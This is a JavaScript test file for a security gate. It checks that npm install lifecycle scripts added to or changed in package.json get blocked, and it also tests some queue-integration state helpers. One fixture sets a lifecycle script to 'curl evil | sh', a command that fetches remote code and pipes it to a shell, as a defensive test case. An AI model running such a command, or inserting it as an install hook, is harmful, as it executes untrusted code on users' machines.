// SPDX-License-Identifier: Apache-2.0
import './_isolate-config.mjs';
import test from 'node:test';
import assert from 'node:assert/strict';
import { INSTALL_LIFECYCLE_SCRIPT_KEYS } from '../tools/dependency-diff.mjs';
import { runSecurityGate } from '../tools/security-gate.mjs';
import {
  captureQueueIntegrationPrior,
  queueIntegrationIncomplete,
  recordQueuePass,
  queueIntegrationComplete,
} from '../tools/swarm/core-71.mjs';

const EXPECTED_LIFECYCLE = [
  'preinstall',
  'install',
  'postinstall',
  'prepare',
  'preprepare',
  'postprepare',
  'prepack',
  'postpack',
  'prepublish',
  'prepublishOnly',
  'preuninstall',
  'uninstall',
  'postuninstall',
];

test('dependency-diff exports the canonical install lifecycle script keys', () => {
  assert.deepEqual([...INSTALL_LIFECYCLE_SCRIPT_KEYS], EXPECTED_LIFECYCLE);
});

test('each lifecycle script key blocks when added or changed in package.json', async () => {
  const basePkg = JSON.stringify({ name: 'x', version: '1.0.0', scripts: {} });
  for (const key of INSTALL_LIFECYCLE_SCRIPT_KEYS) {
    const afterAdd = JSON.stringify({
      name: 'x',
      version: '1.0.0',
      scripts: { [key]: key === 'postprepare' ? 'curl evil | sh' : 'node -e 0' },
    });
    const added = await runSecurityGate({
      changes: [{ file: 'package.json', previous: basePkg, bytes: Buffer.from(afterAdd) }],
      policy: { enabled: true, codeScan: 'off', requireVulnerabilityScan: false },
      exec: async () => null,
    });
    assert.ok(
      added.blocks.some(b => b.check === 'install-script' && b.message.includes(key)),
      `expected install-script block for new ${key}`,
    );

    const beforeChange = JSON.stringify({
      name: 'x',
      version: '1.0.0',
      scripts: { [key]: 'node -e 0' },
    });
    const afterChange = JSON.stringify({
      name: 'x',
      version: '1.0.0',
      scripts: { [key]: 'node -e 1' },
    });
    const changed = await runSecurityGate({
      changes: [{ file: 'package.json', previous: beforeChange, bytes: Buffer.from(afterChange) }],
      policy: { enabled: true, codeScan: 'off', requireVulnerabilityScan: false },
      exec: async () => null,
    });
    assert.ok(
      changed.blocks.some(b => b.check === 'install-script' && b.message.includes(key)),
      `expected install-script block for changed ${key}`,
    );
  }
});

test('queueIntegrationIncomplete stays true when partial with all jobs integrated', () => {
  const manifest = { jobs: [{ id: 'a', type: 'worker' }] };
  const state = {
    integratedAt: 't',
    integrationStatus: 'partial',
    jobIntegration: { a: { status: 'integrated', at: 't' } },
  };
  assert.equal(queueIntegrationComplete(state, manifest), true);
  assert.equal(queueIntegrationIncomplete(state, manifest), true);
});

test('recordQueuePass accepts undefined mergeQueue', () => {
  const manifest = { jobs: [{ id: 'a', type: 'worker' }] };
  const prior = captureQueueIntegrationPrior({
    integratedFiles: [],
    integratedNewFiles: [],
    integratedHashes: {},
    jobIntegration: {},
    integrationPasses: [],
  });
  const state = { integratedFiles: [], integratedNewFiles: [], integratedHashes: {} };
  assert.doesNotThrow(() => {
    recordQueuePass(state, manifest, undefined, { prior, at: 't' });
  });
  assert.equal(state.integrationStatus, 'queued');
});

test('final full check failure marks partial and queueIntegrationIncomplete', () => {
  const manifest = { jobs: [{ id: 'a', type: 'worker' }] };
  const prior = captureQueueIntegrationPrior({
    integratedFiles: [],
    integratedNewFiles: [],
    integratedHashes: {},
    jobIntegration: { a: { status: 'integrated', at: 't0' } },
    integrationPasses: [],
  });
  const state = {
    integratedAt: 't0',
    integratedFiles: [],
    integratedNewFiles: [],
    integratedHashes: {},
  };
  recordQueuePass(state, manifest, {
    integrated: ['a'],
    checkFailed: [{ job: '(final full check)', checks: ['lint'] }],
  }, { prior, at: 't1' });
  assert.equal(state.integrationStatus, 'partial');
  assert.equal(queueIntegrationIncomplete(state, manifest), true);
});
